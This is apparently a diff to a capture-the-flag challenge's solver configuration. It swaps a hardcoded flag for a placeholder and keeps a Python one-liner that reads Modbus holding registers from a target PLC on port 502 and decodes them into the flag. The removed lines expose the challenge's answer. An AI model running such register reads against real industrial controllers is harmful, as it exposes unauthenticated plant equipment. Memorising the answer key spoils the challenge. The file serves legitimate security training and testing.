@@ -15,9 +15,9 @@ solver:
     expect: ok
   - name: Holding registers decode to the flag
     command: python3 -c "import socket,struct;s=socket.create_connection(('{target.plc}',502),5);req=struct.pack('>HHHBBHH',1,0,6,1,3,0,40);s.sendall(req);r=s.recv(256);bc=r[8];vals=struct.unpack('>%dH'%(bc//2),r[9:9+bc]);out=''.join(chr(v) for v in vals if 32<=v<127);print(out.split(chr(0))[0])"
-    expect: OCR{m0dbu5_r3g15t3r5_r3v34l3d}
+    expect: '{flag}'
 expected_flag_count: 1
-expected_flag: OCR{m0dbu5_r3g15t3r5_r3v34l3d}
+expected_flag: '{flag}'
 forbidden_networks:
 - control-plane
 - database
